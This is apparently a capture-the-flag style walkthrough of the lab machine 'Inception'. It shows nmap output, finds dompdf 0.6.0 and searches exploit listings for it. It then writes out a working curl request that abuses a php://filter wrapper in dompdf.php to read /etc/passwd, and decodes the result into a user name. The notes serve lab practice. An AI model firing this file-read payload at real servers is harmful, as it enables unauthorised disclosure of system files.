################################
Inception
################################

1-Enumeration:
    nmap -T5 -sV -sC -Pn 10.10.10.67 -oN enum/scan1.logs -vv
    PORT     STATE SERVICE    REASON  VERSION
    80/tcp   open  http       syn-ack Apache httpd 2.4.18 ((Ubuntu))
    |_http-title: Inception
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    3128/tcp open  http-proxy syn-ack Squid http proxy 3.5.12
    |_http-server-header: squid/3.5.12
    |_http-title: ERROR: The requested URL could not be retrieved


    Port 80:
        Web servers: Apache HTTP Server 2.4.18
        Operating systems: Ubuntu
        
        http://10.10.10.67/assets/

        In 'inspection mode' we found 'dompdf'

        http://10.10.10.67/dompdf/:
            We found some files and the version 0.6.0


        searhsploit dompdf 0.6.0
        searhsploit -x <exploitPath>


        We will try to extract users in /etc/passwd:
            curl http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd


        We extract the users name in base64, LETS Decode:
            echo <payload> -n | base64 -d 
                cobb:x:1000:1000::/home/cobb:/bin/bash

        
